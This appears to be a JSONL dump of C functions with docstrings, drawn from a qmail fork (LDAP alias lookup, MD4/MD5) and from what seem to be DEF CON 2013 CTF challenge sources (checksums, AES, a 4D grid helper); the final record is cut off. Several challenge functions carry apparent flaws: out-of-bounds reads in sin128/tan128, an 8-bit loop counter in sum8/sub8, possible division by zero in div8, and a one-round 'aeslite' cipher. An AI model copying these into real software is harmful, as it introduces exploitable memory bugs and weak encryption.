{"docstring": "/* Look up real domain based on alias domain name\n * Returns NULL, if no such mapping found (for real domains, for example)\n * Returns a static (char*) real_domain otherwise\n * Caller must issue read_controls(...,qldap_ctrl_generic,...) BEFORE \n *   in order to properly initialize domain_map_file\n * */\n", "func_signal": "char*\nqldap_domain_alias(const char* alias_domain)", "code": "{\n\tconst char*\tmapping;\n\tstatic stralloc\treal = {0};\n\tstruct constmap\tdomain_map;\n\n\t/* caller must have issued read_controls(...,qldap_ctrl_generic,...) */\n\tif(!constmap_init(&domain_map,domain_map_file.s,domain_map_file.len,1))\n\t\treturn 0;\n\tmapping = constmap(&domain_map,alias_domain,str_len(alias_domain));\n\n\tif(mapping && *mapping) {\n\t\tif(!stralloc_copys(&real,mapping))\n\t\t\treturn 0;\n\t\tif(!stralloc_0(&real))\n\t\t\treturn 0;\n\t\treturn real.s;\n\t}\n\treturn 0;\n}", "path": "qldap.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* Decodes input (unsigned char) into output (uint32). Assumes len is\n     a multiple of 4.\n */\n", "func_signal": "static void\nDecode(void *out, size_t len, const void *in)", "code": "{\n  uint32 *output = out;\n  const unsigned char *input = in;\n  size_t i, j;\n\n  for (i = 0, j = 0; j < len; i++, j += 4)\n    output[i] = ((uint32)input[j]) | (((uint32)input[j+1]) << 8) |\n      (((uint32)input[j+2]) << 16) | (((uint32)input[j+3]) << 24);\n}", "path": "digest_md4.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD5 block update operation. Continues an MD5 message-digest\n  operation, processing another message block, and updating the\n  context.\n */\n", "func_signal": "void\nMD5Update(MD5_CTX *context, const unsigned char *input, size_t inputLen)", "code": "{\n  unsigned int i, idx, partLen;\n\n  /* Compute number of bytes mod 64 */\n  idx = (unsigned int)((context->count[0] >> 3) & 0x3F);\n\n  /* Update number of bits */\n  if ( (context->count[0] += ((uint32)inputLen << 3)) /* lower part of count */\n       < ((uint32)inputLen << 3) )\n    context->count[1]++; /* low part of count overflowed */\n\n  context->count[1] += ((uint32)inputLen >> 29); /* update high part of count */\n\n  partLen = 64 - idx;\n\n  /* Transform as many times as possible. */\n  if (inputLen >= partLen) {\n    byte_copy ((POINTER)&context->buffer[idx], partLen, input);\n    MD5Transform (context->state, context->buffer);\n\n    for (i = partLen; i + 63 < inputLen; i += 64)\n      MD5Transform (context->state, &input[i]);\n\n    idx = 0;\n  }\n  else\n    i = 0;\n\n  /* Buffer remaining input */\n  byte_copy ((POINTER)&context->buffer[idx], inputLen-i, &input[i]);\n}", "path": "digest_md5.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD4 block update operation. Continues an MD4 message-digest\n     operation, processing another message block, and updating the\n     context.\n */\n", "func_signal": "void\nMD4Update(MD4_CTX *context, const unsigned char *input, size_t inputLen)", "code": "{\n  unsigned int i, idx, partLen;\n\n  /* Compute number of bytes mod 64 */\n  idx = (unsigned int)((context->count[0] >> 3) & 0x3F);\n\n  /* Update number of bits */\n  if ( (context->count[0] += ((uint32)inputLen << 3)) /* lower part of count */\n       < ((uint32)inputLen << 3) )\n    context->count[1]++; /* low part of count overflowed */\n\n  context->count[1] += ((uint32)inputLen >> 29); /* update high part of count */\n\n  partLen = 64 - idx;\n  /* Transform as many times as possible.  */\n  if (inputLen >= partLen) {\n    byte_copy\n      ((POINTER)&context->buffer[idx], partLen, input);\n    MD4Transform(context->state, context->buffer);\n\n    for (i = partLen; i + 63 < inputLen; i += 64)\n      MD4Transform(context->state, &input[i]);\n\n    idx = 0;\n  }\n  else\n    i = 0;\n\n  /* Buffer remaining input */\n  byte_copy\n    ((POINTER)&context->buffer[idx], inputLen-i, &input[i]);\n}", "path": "digest_md4.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD5 basic transformation. Transforms state based on block.\n */\n", "func_signal": "static void\nMD5Transform(uint32 state[4], const unsigned char block[64])", "code": "{\n  uint32 a = state[0], b = state[1], c = state[2], d = state[3], x[16];\n\n  Decode (x, 64, block);\n\n  /* Round 1 */\n  FF (a, b, c, d, x[ 0], S11, 0xd76aa478); /* 1 */\n  FF (d, a, b, c, x[ 1], S12, 0xe8c7b756); /* 2 */\n  FF (c, d, a, b, x[ 2], S13, 0x242070db); /* 3 */\n  FF (b, c, d, a, x[ 3], S14, 0xc1bdceee); /* 4 */\n  FF (a, b, c, d, x[ 4], S11, 0xf57c0faf); /* 5 */\n  FF (d, a, b, c, x[ 5], S12, 0x4787c62a); /* 6 */\n  FF (c, d, a, b, x[ 6], S13, 0xa8304613); /* 7 */\n  FF (b, c, d, a, x[ 7], S14, 0xfd469501); /* 8 */\n  FF (a, b, c, d, x[ 8], S11, 0x698098d8); /* 9 */\n  FF (d, a, b, c, x[ 9], S12, 0x8b44f7af); /* 10 */\n  FF (c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */\n  FF (b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */\n  FF (a, b, c, d, x[12], S11, 0x6b901122); /* 13 */\n  FF (d, a, b, c, x[13], S12, 0xfd987193); /* 14 */\n  FF (c, d, a, b, x[14], S13, 0xa679438e); /* 15 */\n  FF (b, c, d, a, x[15], S14, 0x49b40821); /* 16 */\n\n /* Round 2 */\n  GG (a, b, c, d, x[ 1], S21, 0xf61e2562); /* 17 */\n  GG (d, a, b, c, x[ 6], S22, 0xc040b340); /* 18 */\n  GG (c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */\n  GG (b, c, d, a, x[ 0], S24, 0xe9b6c7aa); /* 20 */\n  GG (a, b, c, d, x[ 5], S21, 0xd62f105d); /* 21 */\n  GG (d, a, b, c, x[10], S22,  0x2441453); /* 22 */\n  GG (c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */\n  GG (b, c, d, a, x[ 4], S24, 0xe7d3fbc8); /* 24 */\n  GG (a, b, c, d, x[ 9], S21, 0x21e1cde6); /* 25 */\n  GG (d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */\n  GG (c, d, a, b, x[ 3], S23, 0xf4d50d87); /* 27 */\n  GG (b, c, d, a, x[ 8], S24, 0x455a14ed); /* 28 */\n  GG (a, b, c, d, x[13], S21, 0xa9e3e905); /* 29 */\n  GG (d, a, b, c, x[ 2], S22, 0xfcefa3f8); /* 30 */\n  GG (c, d, a, b, x[ 7], S23, 0x676f02d9); /* 31 */\n  GG (b, c, d, a, x[12], S24, 0x8d2a4c8a); /* 32 */\n\n  /* Round 3 */\n  HH (a, b, c, d, x[ 5], S31, 0xfffa3942); /* 33 */\n  HH (d, a, b, c, x[ 8], S32, 0x8771f681); /* 34 */\n  HH (c, d, a, b, x[11], S33, 0x6d9d6122); /* 35 */\n  HH (b, c, d, a, x[14], S34, 0xfde5380c); /* 36 */\n  HH (a, b, c, d, x[ 1], S31, 0xa4beea44); /* 37 */\n  HH (d, a, b, c, x[ 4], S32, 0x4bdecfa9); /* 38 */\n  HH (c, d, a, b, x[ 7], S33, 0xf6bb4b60); /* 39 */\n  HH (b, c, d, a, x[10], S34, 0xbebfbc70); /* 40 */\n  HH (a, b, c, d, x[13], S31, 0x289b7ec6); /* 41 */\n  HH (d, a, b, c, x[ 0], S32, 0xeaa127fa); /* 42 */\n  HH (c, d, a, b, x[ 3], S33, 0xd4ef3085); /* 43 */\n  HH (b, c, d, a, x[ 6], S34,  0x4881d05); /* 44 */\n  HH (a, b, c, d, x[ 9], S31, 0xd9d4d039); /* 45 */\n  HH (d, a, b, c, x[12], S32, 0xe6db99e5); /* 46 */\n  HH (c, d, a, b, x[15], S33, 0x1fa27cf8); /* 47 */\n  HH (b, c, d, a, x[ 2], S34, 0xc4ac5665); /* 48 */\n\n  /* Round 4 */\n  II (a, b, c, d, x[ 0], S41, 0xf4292244); /* 49 */\n  II (d, a, b, c, x[ 7], S42, 0x432aff97); /* 50 */\n  II (c, d, a, b, x[14], S43, 0xab9423a7); /* 51 */\n  II (b, c, d, a, x[ 5], S44, 0xfc93a039); /* 52 */\n  II (a, b, c, d, x[12], S41, 0x655b59c3); /* 53 */\n  II (d, a, b, c, x[ 3], S42, 0x8f0ccc92); /* 54 */\n  II (c, d, a, b, x[10], S43, 0xffeff47d); /* 55 */\n  II (b, c, d, a, x[ 1], S44, 0x85845dd1); /* 56 */\n  II (a, b, c, d, x[ 8], S41, 0x6fa87e4f); /* 57 */\n  II (d, a, b, c, x[15], S42, 0xfe2ce6e0); /* 58 */\n  II (c, d, a, b, x[ 6], S43, 0xa3014314); /* 59 */\n  II (b, c, d, a, x[13], S44, 0x4e0811a1); /* 60 */\n  II (a, b, c, d, x[ 4], S41, 0xf7537e82); /* 61 */\n  II (d, a, b, c, x[11], S42, 0xbd3af235); /* 62 */\n  II (c, d, a, b, x[ 2], S43, 0x2ad7d2bb); /* 63 */\n  II (b, c, d, a, x[ 9], S44, 0xeb86d391); /* 64 */\n\n  state[0] += a;\n  state[1] += b;\n  state[2] += c;\n  state[3] += d;\n\n  /* Zeroize sensitive information. */\n  byte_zero ((POINTER)x, sizeof (x));\n}", "path": "digest_md5.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* TODO logging */\n", "func_signal": "int\nread_controls(ctrlfunc *f)", "code": "{\n\tint\ti, fddir;\n\t\n\tfddir = open_read(\".\");\n\tif (fddir == -1)\n\t\treturn -1;\n\tif (chdir(auto_qmail) == -1)\n\t\treturn -1;\n\t\n\tif (control_init() == -1)\n\t\tgoto fail;\n\tfor (i = 0; f[i] != 0; i++) {\n\t\tif (f[i]() == -1)\n\t\t\tgoto fail;\n\t}\n\n\tif (fchdir(fddir) == -1)\n\t\treturn -1;\n\tclose(fddir);\n\treturn 0;\n\t\nfail:\n\ti = errno;\n\tif (fchdir(fddir) == -1)\n\t\treturn -1;\n\tclose(fddir);\n\terrno = i;\n\treturn -1;\n}", "path": "read-ctrl.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD5 finalization. Ends an MD5 message-digest operation, writing the\n  the message digest and zeroizing the context.\n */\n", "func_signal": "void\nMD5Final(unsigned char digest[MD5_LEN], MD5_CTX *context)", "code": "{\n  unsigned char bits[8];\n  unsigned int idx;\n  size_t padLen;\n  uint32 hi, lo;\n\n  /* Save number of bits */\n  hi = context->count[1];\n  lo = context->count[0];\n  Encode (bits, 4, &lo);\n  Encode (bits + 4, 4, &hi);\n\n  /* Pad out to 56 mod 64. */\n  idx = (unsigned int)((context->count[0] >> 3) & 0x3f);\n  padLen = (idx < 56) ? (56 - idx) : (120 - idx);\n  MD5Update (context, PADDING, padLen);\n\n  /* Append length (before padding) */\n  MD5Update (context, bits, 8);\n\n  if (digest != (unsigned char *)0) {\n    /* Store state in digest */\n    Encode (digest, 16, context->state);\n\n    /* Zeroize sensitive information.  */\n    byte_zero ((POINTER)context, sizeof (*context));\n  }\n}", "path": "digest_md5.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* I wrote this do as you please */\n", "func_signal": "void sub8( const unsigned char *input, size_t ilen, unsigned char output[1] )", "code": "{\n    uint8_t s = 0;\n    uint8_t c = 0;\n\n    while ( c < ilen)\n    {\n       s -= input[c++];\n    }\n\n    memcpy(output, &s, 1);\n\n    return;\n}", "path": "bitterswallow\\sub.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/* I wrote this do as you please */\n", "func_signal": "void tan128( const unsigned char *input, size_t ilen, unsigned char output[16])", "code": "{\n    size_t i = ilen / 4;\n    long double j = 0;\n\n    while (i--)\n    {\n        j += tanl(((long double *)input)[i]);\n    }\n\n    memcpy( output, &j, 16);\n\n    return;\n}", "path": "bitterswallow\\tan.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Performs the action of generating the keys that will be used in every round of\n// encryption. \"key\" is the user-supplied input key, \"w\" is the output key schedule,\n// \"keysize\" is the length in bits of \"key\", must be 128, 192, or 256.\n", "func_signal": "void KeyExpansion(uchar key[], uint w[], int keysize)", "code": "{\n   int Nb=4,Nr,Nk,idx;\n   uint temp,Rcon[]={0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,0x20000000,\n                     0x40000000,0x80000000,0x1b000000,0x36000000,0x6c000000,0xd8000000,\n                     0xab000000,0x4d000000,0x9a000000};\n   switch (keysize) {\n      case 128: Nr = 10; Nk = 4; break;\n      case 192: Nr = 12; Nk = 6; break;\n      case 256: Nr = 14; Nk = 8; break;\n      default: return;\n   }\n\n   for (idx=0; idx < Nk; ++idx) {\n      w[idx] = ((key[4 * idx]) << 24) | ((key[4 * idx + 1]) << 16) |\n               ((key[4 * idx + 2]) << 8) | ((key[4 * idx + 3]));\n   }\n\n   for (idx = Nk; idx < Nb * (Nr+1); ++idx) {\n      temp = w[idx - 1];\n      if ((idx % Nk) == 0)\n         temp = SubWord(KE_ROTWORD(temp)) ^ Rcon[(idx-1)/Nk];\n      else if (Nk > 6 && (idx % Nk) == 4)\n         temp = SubWord(temp);\n      w[idx] = w[idx-Nk] ^ temp;\n   }\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "//char b[T*W*H*D+1];\n//char g[maxGuess+1];\n//int nb[numDim*2][2];\n", "func_signal": "void get_neighbor(int p,char b[T*W*H*D+1], int nb[numDim*2][2])", "code": "{\n\t//[T-1][W][H][D] is before\n\tif (p/(W*H*D)>0){\n\t\tnb[before][1] = b[p-(W*H*D)];\n\t\tnb[before][0] = p-(W*H*D);\n\t}\n\telse {\n\t\tnb[before][1] = 0;\n\t\tnb[before][0] = 0;\n\t} \n\t//[T+1][W][H][D] is after\n\tif (p+(W*H*D)<(T*W*H*D)){\n\t\tnb[after][1] = b[p+(W*H*D)];\n\t\tnb[after][0] = p+(W*H*D);\n\t}\n\telse {\n\t\tnb[after][1] = 0;\n\t\tnb[after][0] = 0;\n\t}\n\t//[T][W-1][H][D] is inFrontOf\n\tif ((p%(W*H*D))/(H*D)>0){\n\t\tnb[inFrontOf][1] = b[p-(H*D)];\n\t\tnb[inFrontOf][0] = p-(H*D);\n\t}\n\telse {\n\t\tnb[inFrontOf][1] = 0;\n\t\tnb[inFrontOf][0] = 0;\n\t}\n\t//[T][W+1][H][D] is behindOf\n\tif ((p%(W*H*D))+(H*D)<(W*H*D)){\n\t\tnb[behindOf][1] = b[p+(H*D)];\n\t\tnb[behindOf][0] = p+(H*D);\n\t}\n\telse{\n\t\tnb[behindOf][1] = 0;\n\t\tnb[behindOf][0] = 0;\n\t}\n\t//[T][W][H-1][D] is aboveOf\n\tif (((p%(H*D))/D)>0){\n\t\tnb[aboveOf][1] = b[p-D];\n\t\tnb[aboveOf][0] = p-D; \n\t}\n\telse{\n\t\tnb[aboveOf][1]=0;\n\t\tnb[aboveOf][0]=0;\n\t}\n\t//[T][W][H+1][D] is belowOf\n\tif (((p%(H*D))+D)<(H*D)){\n\t\tnb[belowOf][1] = b[p+D];\n\t\tnb[belowOf][0] = p+D;\n\t}\n\telse{\n\t\tnb[belowOf][1] =0;\n\t\tnb[belowOf][0] =0;\n\t}\n\t//[T][W][H][D-1] is leftOf\n\tif (((p%D)-1)>=0){\n\t\tnb[leftOf][1] = b[p-1];\n\t\tnb[leftOf][0] = p-1;\n\t}\n\telse{\n\t\tnb[leftOf][1]=0;\n\t\tnb[leftOf][0]=0;\n\t}\t\t\n\t//[T][W][H][D+1] is rightOf\n\tif (((p%D)+1)<D){\n\t\tnb[rightOf][1] = b[p+1];\n\t\tnb[rightOf][0] = p+1;\n\t}\n\telse{\n\t\tnb[rightOf][1]=0;\n\t\tnb[rightOf][0]=0;\n\t}\n\n\treturn;\n\t\n}", "path": "timesquared\\timescubed.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/* Based upon wikipedia en.wikipedia.org/wiki/Fletcher's_checksum. I didn't see a license */\n", "func_signal": "void fletcher16( const unsigned char *input, size_t ilen, unsigned char output[2] )", "code": "{\n    uint16_t sum1 = 0;\n    uint16_t sum2 = 0;\n    uint16_t c = 0;\n\n    while (c < ilen)\n    {\n        sum1 = (sum1 + input[c++]) % 0xff;\n        sum2 = (sum2 + sum1) % 0xff;\n    }\n\n    sum2 = (sum2 <<8) | sum1;\n\n    memcpy(output, &sum2, 2);\n\n    return;\n}", "path": "bitterswallow\\fletcher.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// All rows are shifted cylindrically to the right.\n", "func_signal": "void InvShiftRows(uchar state[][4])", "code": "{\n   int t;\n   // Shift right by 1\n   t = state[1][3];\n   state[1][3] = state[1][2];\n   state[1][2] = state[1][1];\n   state[1][1] = state[1][0];\n   state[1][0] = t;\n   // Shift right by 2\n   t = state[2][3];\n   state[2][3] = state[2][1];\n   state[2][1] = t;\n   t = state[2][2];\n   state[2][2] = state[2][0];\n   state[2][0] = t;\n   // Shift right by 3\n   t = state[3][3];\n   state[3][3] = state[3][0];\n   state[3][0] = state[3][1];\n   state[3][1] = state[3][2];\n   state[3][2] = t;\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/* I wrote this do as you please */\n", "func_signal": "void sin128( const unsigned char *input, size_t ilen, unsigned char output[16])", "code": "{\n    size_t i = ilen / 4;\n    long double j = 0;\n\n    while (i--)\n    {\n        j += sinl(((long double *)input)[i]);\n    }\n\n    memcpy( output, &j, 16);\n\n    return;\n}", "path": "bitterswallow\\sin.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/* I wrote this do as you please */\n", "func_signal": "void sum8( const unsigned char *input, size_t ilen, unsigned char output[1] )", "code": "{\n    uint8_t s = 0;\n    uint8_t c = 0;\n\n    while ( c < ilen)\n    {\n       s += input[c++];\n    }\n\n    memcpy(output, &s, 1);\n\n    return;\n}", "path": "bitterswallow\\sum.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/********************\n** AES (En/De)Crypt\n********************/\n", "func_signal": "void build_state_array_from_string(uchar in[], uchar state[4][4])", "code": "{\n   state[0][0] = in[0];\n   state[1][0] = in[1];\n   state[2][0] = in[2];\n   state[3][0] = in[3];\n   state[0][1] = in[4];\n   state[1][1] = in[5];\n   state[2][1] = in[6];\n   state[3][1] = in[7];\n   state[0][2] = in[8];\n   state[1][2] = in[9];\n   state[2][2] = in[10];\n   state[3][2] = in[11];\n   state[0][3] = in[12];\n   state[1][3] = in[13];\n   state[2][3] = in[14];\n   state[3][3] = in[15];\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "/* Do what you will I wrote this. */\n", "func_signal": "void div8( const unsigned char *input, size_t ilen, unsigned char output[1] )", "code": "{\n    uint8_t s = 0xba;\n    uint8_t c = 0;\n\n    while ( c < ilen)\n    {\n       s = s + (s / input[c++]);\n    }\n\n    memcpy(output, &s, 1);\n\n    return;\n}", "path": "bitterswallow\\div.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// \"in\" is the block of 16 sequencial bytes that is to be encrypted. \"out\" is the encrypted\n// sequencial output. \"key\" is an array consisting of the KEY value that was generated\n// using KeySchedule() previously. \"keysize\" MUST be 128, 192, 256 in size.\n", "func_signal": "void aeslite_encrypt(uchar in[], uchar out[], uint key[], int keysize)", "code": "{\n   uchar state[4][4];\n   // Copy input array (should be 16 bytes long) to a matrix (sequential bytes are ordered\n   // by row, not col) called \"state\" for processing.\n   // *** Implementation note: The official AES documentation references the state by\n   // column, then row. Accessing an element in C requires row then column. Thus, all state\n   // references in AES must have the column and row indexes reversed for C implementation.\n   build_state_array_from_string(in, state);\n\n   AddRoundKey(state,&key[0]);\n   SubBytes(state); ShiftRows(state); MixColumns(state);\n\n   // Copy the state to the output array\n   build_string_from_state_array(state, out);\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Performs the SubWord substitution for KeyExpansion. Each byte in the supplied integer\n// is looked up in the substitution box and replaced by its corresponding value.\n", "func_signal": "uint SubWord(uint word)", "code": "{\n   unsigned int result;\n\n   result = (int)aes_sbox[(word >> 4) & 0x0000000F][word & 0x0000000F];\n   result += (int)aes_sbox[(word >> 12) & 0x0000000F][(word >> 8) & 0x0000000F] << 8;\n   result += (int)aes_sbox[(word >> 20) & 0x0000000F][(word >> 16) & 0x0000000F] << 16;\n   result += (int)aes_sbox[(word >> 28) & 0x0000000F][(word >> 24) & 0x0000000F] << 24;\n   return(result);\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// \"in\" is the block of 16 sequencial bytes that is to be encrypted. \"out\" is the encrypted\n// sequencial output. \"key\" is an array consisting of the KEY value that was generated\n// using KeySchedule() previously. \"keysize\" MUST be 128, 192, 256 in size.\n", "func_signal": "void aes_encrypt(uchar in[], uchar out[], uint key[], int keysize)", "code": "{\n   uchar state[4][4];\n   // Copy input array (should be 16 bytes long) to a matrix (sequential bytes are ordered\n   // by row, not col) called \"state\" for processing.\n   // *** Implementation note: The official AES documentation references the state by\n   // column, then row. Accessing an element in C requires row then column. Thus, all state\n   // references in AES must have the column and row indexes reversed for C implementation.\n   build_state_array_from_string(in, state);\n\n   // Perform the necessary number of rounds. The round key is added first.\n   // The last round does not perform the MixColumns step.\n   AddRoundKey(state,&key[0]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[4]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[8]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[12]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[16]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[20]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[24]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[28]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[32]);\n   SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[36]);\n   if (keysize != 128) {\n      SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[40]);\n      SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[44]);\n      if (keysize != 192) {\n         SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[48]);\n         SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state,&key[52]);\n         SubBytes(state); ShiftRows(state); AddRoundKey(state,&key[56]);\n      }\n      else {\n         SubBytes(state); ShiftRows(state); AddRoundKey(state,&key[48]);\n      }\n   }\n   else {\n      SubBytes(state); ShiftRows(state); AddRoundKey(state,&key[40]);\n   }\n\n   // Copy the state to the output array\n   build_string_from_state_array(state, out);\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Performs the MixColums step. The state is multiplied by itself using matrix\n// multiplication in a Galios Field 2^8. All multiplication is pre-computed in a table.\n// Addition is equivilent to XOR. (Must always make a copy of the column as the original\n// values will be destoyed.)\n", "func_signal": "void MixColumns(uchar state[][4])", "code": "{\n   uchar col[4];\n   // Column 1\n   col[0] = state[0][0];\n   col[1] = state[1][0];\n   col[2] = state[2][0];\n   col[3] = state[3][0];\n   state[0][0] = gf_mul[col[0]][0];\n   state[0][0] ^= gf_mul[col[1]][1];\n   state[0][0] ^= col[2];\n   state[0][0] ^= col[3];\n   state[1][0] = col[0];\n   state[1][0] ^= gf_mul[col[1]][0];\n   state[1][0] ^= gf_mul[col[2]][1];\n   state[1][0] ^= col[3];\n   state[2][0] = col[0];\n   state[2][0] ^= col[1];\n   state[2][0] ^= gf_mul[col[2]][0];\n   state[2][0] ^= gf_mul[col[3]][1];\n   state[3][0] = gf_mul[col[0]][1];\n   state[3][0] ^= col[1];\n   state[3][0] ^= col[2];\n   state[3][0] ^= gf_mul[col[3]][0];\n   // Column 2\n   col[0] = state[0][1];\n   col[1] = state[1][1];\n   col[2] = state[2][1];\n   col[3] = state[3][1];\n   state[0][1] = gf_mul[col[0]][0];\n   state[0][1] ^= gf_mul[col[1]][1];\n   state[0][1] ^= col[2];\n   state[0][1] ^= col[3];\n   state[1][1] = col[0];\n   state[1][1] ^= gf_mul[col[1]][0];\n   state[1][1] ^= gf_mul[col[2]][1];\n   state[1][1] ^= col[3];\n   state[2][1] = col[0];\n   state[2][1] ^= col[1];\n   state[2][1] ^= gf_mul[col[2]][0];\n   state[2][1] ^= gf_mul[col[3]][1];\n   state[3][1] = gf_mul[col[0]][1];\n   state[3][1] ^= col[1];\n   state[3][1] ^= col[2];\n   state[3][1] ^= gf_mul[col[3]][0];\n   // Column 3\n   col[0] = state[0][2];\n   col[1] = state[1][2];\n   col[2] = state[2][2];\n   col[3] = state[3][2];\n   state[0][2] = gf_mul[col[0]][0];\n   state[0][2] ^= gf_mul[col[1]][1];\n   state[0][2] ^= col[2];\n   state[0][2] ^= col[3];\n   state[1][2] = col[0];\n   state[1][2] ^= gf_mul[col[1]][0];\n   state[1][2] ^= gf_mul[col[2]][1];\n   state[1][2] ^= col[3];\n   state[2][2] = col[0];\n   state[2][2] ^= col[1];\n   state[2][2] ^= gf_mul[col[2]][0];\n   state[2][2] ^= gf_mul[col[3]][1];\n   state[3][2] = gf_mul[col[0]][1];\n   state[3][2] ^= col[1];\n   state[3][2] ^= col[2];\n   state[3][2] ^= gf_mul[col[3]][0];\n   // Column 4\n   col[0] = state[0][3];\n   col[1] = state[1][3];\n   col[2] = state[2][3];\n   col[3] = state[3][3];\n   state[0][3] = gf_mul[col[0]][0];\n   state[0][3] ^= gf_mul[col[1]][1];\n   state[0][3] ^= col[2];\n   state[0][3] ^= col[3];\n   state[1][3] = col[0];\n   state[1][3] ^= gf_mul[col[1]][0];\n   state[1][3] ^= gf_mul[col[2]][1];\n   state[1][3] ^= col[3];\n   state[2][3] = col[0];\n   state[2][3] ^= col[1];\n   state[2][3] ^= gf_mul[col[2]][0];\n   state[2][3] ^= gf_mul[col[3]][1];\n   state[3][3] = gf_mul[col[0]][1];\n   state[3][3] ^= col[1];\n   state[3][3] ^= col[2];\n   state[3][3] ^= gf_mul[col[3]][0];\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// This prints the key (4 consecutive ints) used for a given round as a linear hex string.\n", "func_signal": "void print_rnd_key(uint key[])", "code": "{\n   int idx;\n//   for (idx=0; idx < 4; idx++)\n//      printf(\"%08x\",key[idx]);\n   puts(\"\");\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Performs the ShiftRows step. All rows are shifted cylindrically to the left.\n", "func_signal": "void ShiftRows(uchar state[][4])", "code": "{\n   int t;\n   // Shift left by 1\n   t = state[1][0];\n   state[1][0] = state[1][1];\n   state[1][1] = state[1][2];\n   state[1][2] = state[1][3];\n   state[1][3] = t;\n   // Shift left by 2\n   t = state[2][0];\n   state[2][0] = state[2][2];\n   state[2][2] = t;\n   t = state[2][1];\n   state[2][1] = state[2][3];\n   state[2][3] = t;\n   // Shift left by 3\n   t = state[3][0];\n   state[3][0] = state[3][3];\n   state[3][3] = state[3][2];\n   state[3][2] = state[3][1];\n   state[3][1] = t;\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// This prints the \"state\" grid as a linear hex string\n", "func_signal": "void printstate(uchar state[][4])", "code": "{\n   int idx,idx2;\n   for (idx=0; idx < 4; idx++)\n      for (idx2=0; idx2 < 4; idx2++)\n         printf(\"%02x\",state[idx2][idx]);\n   puts(\"\");\n}", "path": "thyself\\aes.c", "repo_name": "legitbs/quals-2013", "stars": 39, "license": "other", "language": "c", "size": 549}
{"docstring": "// Performs the SubBytes step. All bytes in the state are substituted with a \n// pre-calculated value from a lookup table.\n", "func_signal": "void SubBytes(uchar state[][4])", "code": "{\n   state[0][0] = aes_sbox[state[0][0] >> 4][state[0][0] & 0x0F];\n   state[0][1] = aes_sbox[state[0][1] >> 4][state[0][1] & 0x0F];\n   state[0][2] = aes_sbox[state[0][2] >> 4][state[0][2] & 0x0F];\n   state[0][3] = aes_sbox[state[0][3] >> 4][state[0][3] & 0x0F];\n   state[1][0] = aes_sbox[state[1][0] >> 4][state[1][0] & 0x0F];\n   state[1][1] = aes_sbox[state[1][1] >> 4][state[1][1] & 0x0F];\n   state[1][2] = aes_sbox[state[1][2] >> 4][state[1][2] & 0x0F];\n   state[1][3] = aes_sbox[state[1][3] >> 4][state[1][3] & 0x0F];\n   state[2][0] = aes_sbox[state[2][0] >> 4][state[2][0] & 0x0F];\n   state[2][1] = aes_sbox[state[2][1] >> 4][state[2][1] & 0x0F];\n   state[2][2] = aes_sbox[state[2][2] >> 4][state[2][2] & 0x0F];\n   state[2][3] = aes_sbox[state[2][3] >> 4][state[2][3] & 0x0F];\n   state[3][0] = 